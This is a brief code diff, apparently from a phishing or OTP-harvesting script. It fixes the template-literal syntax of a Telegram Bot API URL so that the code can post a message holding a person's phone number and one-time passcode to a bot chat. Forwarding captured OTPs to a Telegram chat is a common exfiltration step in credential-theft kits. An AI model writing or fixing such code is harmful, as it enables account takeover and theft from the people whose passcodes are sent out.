@@ -26,7 +26,7 @@ Phone: ${phone}
 OTP: ${otp}
 `;
 
-    const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
     await axios.post(url, {
       chat_id: CHAT_ID,
